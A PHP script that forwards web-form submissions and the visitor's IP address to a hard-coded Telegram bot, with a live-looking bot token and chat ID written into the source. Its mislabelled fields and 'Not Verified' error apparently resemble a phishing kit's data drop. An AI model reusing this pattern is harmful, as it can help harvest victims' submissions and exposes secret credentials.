<?php
// process_form.php
// Configuration and form processing script for Telegram Bot

// Enable error reporting for debugging (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Telegram Bot Configuration
$telegram_bot_token = '7950385033:AAE0z5uHkW_7L2YGHGzKdak2CmDfV8LOJDg'; // Replace with your bot token
$telegram_chat_id = '7783308158'; // Replace with your chat ID

// Function to send message to Telegram
function sendToTelegram($message, $bot_token, $chat_id) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== false;
}

// Check if form was submitted via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Basic spam protection
    if (!empty($_POST['website'])) {
        die('Spam detected');
    }
    
    // Sanitize input data
    $name = isset($_POST['selected_issue']) ? htmlspecialchars(trim($_POST['selected_issue'])) : '';
    $email = isset($_POST['category']) ? htmlspecialchars(trim($_POST['category'])) : '';
    $phone = isset($_POST['phone']) ? htmlspecialchars(trim($_POST['phone'])) : '';
    $subject = isset($_POST['subject']) ? htmlspecialchars(trim($_POST['subject'])) : 'New Form Submission';
    $message = isset($_POST['name']) ? htmlspecialchars(trim($_POST['name'])) : '';
    
    // Validate required fields
    $errors = [];
    
    if (empty($name)) {
        $errors[] = 'Name is required';
    }
    
    if (empty($email)) {
        $errors[] = 'Valid category is required';
    }
    
    if (empty($message)) {
        $errors[] = 'Message is required';
    }
    
    // If there are errors, return them
    if (!empty($errors)) {
        $url = 'form.php?issue=' . $name . '&error=' . $errors[0];
        header("Location: $url");
        exit;
    }
    
    // Format the message for Telegram
    $telegram_message = "
    <b>📧 New Form Submission</b>

    <b>Name:</b> {$name}
    <b>Category:</b> {$email}
    <b>Phone:</b> " . ($phone ?: 'Not provided') . "
    <b>Subject:</b> {$subject}

    <b>Message:</b>
    {$message}

    <b>IP Address:</b> {$_SERVER['REMOTE_ADDR']}
    <b>Time:</b> " . date('Y-m-d H:i:s') . "
        ";
    
    // Send to Telegram
    $telegram_sent = sendToTelegram($telegram_message, $telegram_bot_token, $telegram_chat_id);
    
    if ($telegram_sent) {
        // Success response
        //http_response_code(200);
        header("Location: success.php");
    } else {
        // Telegram API error
        $url = 'form.php?issue=' . $name . '&error=Not Verified';
        header("Location: $url");
    }
    
} else {
    // Not a POST request
    $url = 'form.php?issue=' . $name . '&error=Not Allowed';
    header("Location: $url");
}
?>